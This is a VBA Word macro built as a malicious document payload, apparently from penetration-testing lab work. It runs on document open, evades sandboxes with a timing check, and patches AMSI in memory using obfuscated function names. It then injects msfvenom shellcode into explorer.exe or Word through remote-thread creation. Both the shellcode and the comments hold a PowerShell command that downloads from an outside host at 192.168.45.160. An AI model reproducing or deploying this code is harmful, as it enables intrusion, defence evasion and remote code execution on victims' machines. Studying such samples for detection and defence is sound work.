'av / 4msi
Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long
Public Declare PtrSafe Function EnumProcessModulesEx Lib "psapi.dll" (ByVal hProcess As LongPtr, lphModule As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr, ByVal dwFilterFlag As LongPtr) As LongPtr
Public Declare PtrSafe Function GetModuleBaseName Lib "psapi.dll" Alias "GetModuleBaseNameA" (ByVal hProcess As LongPtr, ByVal hModule As LongPtr, ByVal lpFileName As String, ByVal nSize As LongPtr) As LongPtr
'std
Private Declare PtrSafe Function getmod Lib "KERNEL32" Alias "GetModuleHandleA" (ByVal lpLibFileName As String) As LongPtr
Private Declare PtrSafe Function GetPrAddr Lib "KERNEL32" Alias "GetProcAddress" (ByVal hModule As LongPtr, ByVal lpProcName As String) As LongPtr
Private Declare PtrSafe Function VirtPro Lib "KERNEL32" Alias "VirtualProtect" (lpAddress As Any, ByVal dwSize As LongPtr, ByVal flNewProcess As LongPtr, lpflOldProtect As LongPtr) As LongPtr
Private Declare PtrSafe Sub patched Lib "KERNEL32" Alias "RtlFillMemory" (Destination As Any, ByVal Length As Long, ByVal Fill As Byte)
'inject
Private Declare PtrSafe Function OpenProcess Lib "KERNEL32" (ByVal dwDesiredAcess As Long, ByVal bInheritHandle As Long, ByVal dwProcessId As LongPtr) As LongPtr
Private Declare PtrSafe Function VirtualAllocEx Lib "KERNEL32" (ByVal hProcess As Integer, ByVal lpAddress As LongPtr, ByVal dwSize As LongPtr, ByVal fAllocType As LongPtr, ByVal flProtect As LongPtr) As LongPtr
Private Declare PtrSafe Function WriteProcessMemory Lib "KERNEL32" (ByVal hProcess As LongPtr, ByVal lpBaseAddress As LongPtr, ByRef lpBuffer As LongPtr, ByVal nSize As LongPtr, ByRef lpNumberOfBytesWritten As LongPtr) As LongPtr
Private Declare PtrSafe Function CreateRemoteThread Lib "KERNEL32" (ByVal ProcessHandle As LongPtr, ByVal lpThreadAttributes As Long, ByVal dwStackSize As LongPtr, ByVal lpStartAddress As LongPtr, ByVal lpParameter As Long, ByVal dwCreationFlags As Long, ByVal lpThreadID As Long) As LongPtr
Public Declare PtrSafe Function EnumProcesses Lib "psapi.dll" (lpidProcess As LongPtr, ByVal cb As LongPtr, lpcbNeeded As LongPtr) As LongPtr
Public Declare PtrSafe Function IsWow64Process Lib "KERNEL32" (ByVal hProcess As LongPtr, ByRef Wow64Process As Boolean) As Boolean
Private Declare PtrSafe Function CloseHandle Lib "KERNEL32" (ByVal hObject As LongPtr) As Boolean

Function mymacro()
    Dim myTime
    Dim Timein As Date
    Dim second_time
    Dim Timeout As Date
    Dim subtime As Variant
    Dim vOut As Integer
    Dim Is64 As Boolean
    Dim StrFile As String
    
    ' attempt av detection with sleep
    myTime = Time
    Timein = Date + myTime
    Sleep (4000)
    second_time = Time
    Timeout = Date + second_time
    subtime = DateDiff("s", Timein, Timeout)
    vOut = CInt(subtime)
    If subtime < 3.5 Then
        Exit Function
    End If

    
    StrFile = Dir("c:\windows\system32\a?s?.d*")
    'Call architecture function to determine if we are in 32 bit or 64 bit word. 64 bit returns True.
    Is64 = arch()
    'Call amsi check function to determine if amsi.dll is loaded into Word. This is the case in word 2019+. Returns True if Amsi is found.
    check = amcheck(StrFile, Is64)
    
    'If amsi is found, call amsi patching function
    If check Then
        patch StrFile, Is64
    End If

    If Is64 Then
        'msfvenom -p windows/x64/exec -f vbapplication CMD="powershell.exe -c (new-object net.webclient).DownloadString('http://$ME/Exectest')" EXITFUNC=thread | xclip -selection clipboard
        buf = Array(252, 72, 131, 228, 240, 232, 192, 0, 0, 0, 65, 81, 65, 80, 82, 81, 86, 72, 49, 210, 101, 72, 139, 82, 96, 72, 139, 82, 24, 72, 139, 82, 32, 72, 139, 114, 80, 72, 15, 183, 74, 74, 77, 49, 201, 72, 49, 192, 172, 60, 97, 124, 2, 44, 32, 65, 193, 201, 13, 65, 1, 193, 226, 237, 82, 65, 81, 72, 139, 82, 32, 139, 66, 60, 72, 1, 208, 139, 128, 136, 0, _
        0, 0, 72, 133, 192, 116, 103, 72, 1, 208, 80, 139, 72, 24, 68, 139, 64, 32, 73, 1, 208, 227, 86, 72, 255, 201, 65, 139, 52, 136, 72, 1, 214, 77, 49, 201, 72, 49, 192, 172, 65, 193, 201, 13, 65, 1, 193, 56, 224, 117, 241, 76, 3, 76, 36, 8, 69, 57, 209, 117, 216, 88, 68, 139, 64, 36, 73, 1, 208, 102, 65, 139, 12, 72, 68, 139, 64, 28, 73, 1, _
        208, 65, 139, 4, 136, 72, 1, 208, 65, 88, 65, 88, 94, 89, 90, 65, 88, 65, 89, 65, 90, 72, 131, 236, 32, 65, 82, 255, 224, 88, 65, 89, 90, 72, 139, 18, 233, 87, 255, 255, 255, 93, 72, 186, 1, 0, 0, 0, 0, 0, 0, 0, 72, 141, 141, 1, 1, 0, 0, 65, 186, 49, 139, 111, 135, 255, 213, 187, 224, 29, 42, 10, 65, 186, 166, 149, 189, 157, 255, 213, _
        72, 131, 196, 40, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 89, 65, 137, 218, 255, 213, 112, 111, 119, 101, 114, 115, 104, 101, 108, 108, 46, 101, 120, 101, 32, 45, 99, 32, 40, 110, 101, 119, 45, 111, 98, 106, 101, 99, 116, 32, 110, 101, 116, 46, 119, 101, 98, 99, 108, 105, 101, 110, 116, 41, 46, 68, 111, 119, 110, 108, 111, 97, 100, 83, _
        116, 114, 105, 110, 103, 40, 39, 104, 116, 116, 112, 58, 47, 47, 49, 57, 50, 46, 49, 54, 56, 46, 52, 53, 46, 49, 54, 48, 47, 69, 120, 101, 99, 116, 101, 115, 116, 39, 41, 0)

        'grab handle to target, customizable
        pid = getPID("explorer.exe")
        Handle = OpenProcess(&H1F0FFF, False, pid)
    Else
        'msfvenom -p windows/exec -f vbapplication CMD="powershell.exe -c (new-object net.webclient).DownloadString('http://$ME/Exectest')" EXITFUNC=thread | xclip -selection clipboard
        buf = Array(252, 232, 130, 0, 0, 0, 96, 137, 229, 49, 192, 100, 139, 80, 48, 139, 82, 12, 139, 82, 20, 139, 114, 40, 15, 183, 74, 38, 49, 255, 172, 60, 97, 124, 2, 44, 32, 193, 207, 13, 1, 199, 226, 242, 82, 87, 139, 82, 16, 139, 74, 60, 139, 76, 17, 120, 227, 72, 1, 209, 81, 139, 89, 32, 1, 211, 139, 73, 24, 227, 58, 73, 139, 52, 139, 1, 214, 49, 255, 172, 193, _
        207, 13, 1, 199, 56, 224, 117, 246, 3, 125, 248, 59, 125, 36, 117, 228, 88, 139, 88, 36, 1, 211, 102, 139, 12, 75, 139, 88, 28, 1, 211, 139, 4, 139, 1, 208, 137, 68, 36, 36, 91, 91, 97, 89, 90, 81, 255, 224, 95, 95, 90, 139, 18, 235, 141, 93, 106, 1, 141, 133, 178, 0, 0, 0, 80, 104, 49, 139, 111, 135, 255, 213, 187, 224, 29, 42, 10, 104, 166, 149, _
        189, 157, 255, 213, 60, 6, 124, 10, 128, 251, 224, 117, 5, 187, 71, 19, 114, 111, 106, 0, 83, 255, 213, 112, 111, 119, 101, 114, 115, 104, 101, 108, 108, 46, 101, 120, 101, 32, 45, 99, 32, 40, 110, 101, 119, 45, 111, 98, 106, 101, 99, 116, 32, 110, 101, 116, 46, 119, 101, 98, 99, 108, 105, 101, 110, 116, 41, 46, 68, 111, 119, 110, 108, 111, 97, 100, 83, 116, 114, 105, _
        110, 103, 40, 39, 104, 116, 116, 112, 58, 47, 47, 49, 57, 50, 46, 49, 54, 56, 46, 52, 53, 46, 49, 54, 48, 47, 69, 120, 101, 99, 116, 101, 115, 116, 39, 41, 0)

        Handle = findWow64()
        ' 32-bit Word running on 64-bit OS, no suitable proc found
        If Handle = 0 Then
            'grab handle to target, which has to be running if this macro is opened from word
            pid = getPID("WINWORD.exe")
            Handle = OpenProcess(&H1F0FFF, False, pid)
        End If
    End If

    
    'MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE
    addr = VirtualAllocEx(Handle, 0, UBound(buf), &H3000, &H40)
    'byte-by-byte to attempt sneaking our shellcode past AV hooks
    For counter = LBound(buf) To UBound(buf)
        binData = buf(counter)
        Address = addr + counter
        res = WriteProcessMemory(Handle, Address, binData, 1, 0&)
        Next counter
    thread = CreateRemoteThread(Handle, 0, 0, addr, 0, 0, 0)
End Function

Function arch() As Boolean
 'check architecture of current word process
    #If Win64 Then
        arch = True
    #Else
        arch = False
    #End If
End Function

Function amcheck(StrFile As String, Is64 As Boolean) As Boolean
    'Checks for amsi.dll in word process. If found, returns True
    Dim szProcessName As String
    Dim hMod(0 To 1023) As LongPtr
    Dim numMods As Integer
    Dim res As LongPtr
    amcheck = False
    
    'Assumes 1024 bytes will be enough to hold the module handles
    res = EnumProcessModulesEx(-1, hMod(0), 1024, cbNeeded, &H3)
    If Is64 Then
        numMods = cbNeeded / 8
    Else
        numMods = cbNeeded / 4
    End If
    
    For i = 0 To numMods
        szProcessName = String$(50, 0)
        GetModuleBaseName -1, hMod(i), szProcessName, Len(szProcessName)
        If Left(szProcessName, 8) = StrFile Then
            amcheck = True
        End If
        Next i
End Function

Function findWow64() As Long
    'Enumerates processes on the target and attempts to find one running under WOW64 (i.e. its a 32-bit process)
    'Returns a HANDLE to a 32-bit proc, or 0 if nothing found
    'Assumes only called in 32-bit context
    Dim hProcs(0 To 1023) As LongPtr
    Dim res As LongPtr
    Dim numProcs As Integer
    Dim isWow64 As Boolean
    Dim szProcessName As String
    Dim hMod(0 To 1023) As LongPtr

    isWow64 = False
    findWow64 = 0

    res = EnumProcesses(hProcs(0), 1024, cbNeeded)
    If res <> 0 Then
        numProcs = cbNeeded / 4
        For i = 0 To numProcs
            If hProcs(i) <> 0 Then
                hProcess = OpenProcess(&H1F0FFF, False, hProcs(i))
                If hProcess <> 0 Then
                    res = IsWow64Process(hProcess, isWow64)
                    If isWow64 Then
                        findWow64 = hProcess
                        res = EnumProcessModulesEx(findWow64, hMod(0), 1024, cbNeeded, &H3)
                        szProcessName = String$(50, 0)
                        GetModuleBaseName findWow64, hMod(0), szProcessName, Len(szProcessName)
                        ' Exit immediately if we've found a 32-bit proc other than the Word process
                        If Left(szProcessName, 11) <> "WINWORD.exe" Then
                            Exit Function
                        End If
                    Else
                        res = CloseHandle(hProcess)
                    End If
                    isWow64 = False
                End If
            End If
        Next i
    End If
End Function

Sub patch(StrFile As String, Is64 As Boolean)
    ' Patches amsi.dll in memory in order to disable it.  Loads memory address of amsi.dll and then locates the AmsiUacInitialize function within it.
    ' The AmsiScanBuffer and AmsiScanString functions are located via relative offset from AmsiUacInitialize and then overwritten with a nop and then a ret to disable them.
    ' Depending on architecture these offsets vary, so a case is included for x86 and x64
    Dim lib As LongPtr
    Dim Func_addr As LongPtr
    Dim temp As LongPtr
    Dim old As LongPtr
    Dim off As Integer

    lib = getmod(StrFile)
    If Is64 Then
        off = 96
    Else
        off = 80
    End If
    
    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, 0)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)

    If Is64 Then
        off = 352
    Else
        off = 256
    End If

    Func_addr = GetPrAddr(lib, "Am" & Chr(115) & Chr(105) & "U" & Chr(97) & "c" & "Init" & Chr(105) & Chr(97) & "lize") - off
    temp = VirtPro(ByVal Func_addr, 32, 64, old)
    patched ByVal (Func_addr), 1, ByVal ("&H" & "90")
    patched ByVal (Func_addr + 1), 1, ByVal ("&H" & "C3")
    temp = VirtPro(ByVal Func_addr, 32, old, 0)
End Sub

Function getPID(injProc As String) As LongPtr
    Dim objServices As Object, objProcessSet As Object, Process As Object

    Set objServices = GetObject("winmgmts:\\.\root\CIMV2")
    Set objProcessSet = objServices.ExecQuery("SELECT ProcessID, name FROM Win32_Process WHERE name = """ & injProc & """", , 48)
    For Each Process In objProcessSet
        getPID = Process.ProcessID
    Next
End Function

Sub test()
    mymacro
End Sub
Sub queen()
    'queen is the keyboard mapped macro to run the main test function.
    Application.Run MacroName:="test"
End Sub

Sub Document_Open()
    test
End Sub
Sub AutoOpen()
    test
End Sub
